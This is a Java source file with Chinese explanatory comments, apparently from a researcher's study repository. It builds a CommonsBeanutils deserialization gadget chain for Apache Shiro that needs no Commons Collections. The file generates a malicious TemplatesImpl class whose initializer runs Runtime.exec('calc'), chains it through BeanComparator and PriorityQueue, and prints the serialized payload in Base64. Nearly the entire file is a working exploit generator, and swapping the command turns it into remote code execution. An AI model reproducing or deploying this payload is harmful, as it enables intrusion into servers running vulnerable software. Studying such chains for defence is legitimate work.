package CB;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * Shiro中就是只有CB没有CC
 *
 * 需要满足三个条件：
 * 实现java.util.Comparator接口
 * 实现java.io.Serializable接口
 * Java、shiro或commons-beanutils自带，且兼容性强
 *
 * 通过搜索发现CaseInsensitiveComparator
 * 这个CaseInsensitiveComparator类是java.lang.String类下的一个内部私有类，其实现了Comparator和Serializable，
 * 通过String.CASE_INSENSITIVE_ORDER即可拿到上下文中的CaseInsensitiveComparator对象，用它来实例化BeanComparator
 *
 */
public class CB_withoutCC {

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }

    public static void main(String[] args) throws Exception {
        //
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("new java.io.IOException().printStackTrace();");
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] evilClass = payload.toBytecode();

        // set field
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{evilClass});
        setFieldValue(templates, "_name", "test");
        setFieldValue(templates,"_tfactory", new TransformerFactoryImpl());


        /**
         * 在BeanComparator类的构造函数处，当没有显式传入Comparator的情况下，则默认使用ComparableComparator
         *BeanComparator用来比较两个JavaBean是否相等的类
         */
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        queue.add("1");
        queue.add("1");

        //设置property
        setFieldValue(beanComparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{templates, templates});

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(queue);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();

    }

}
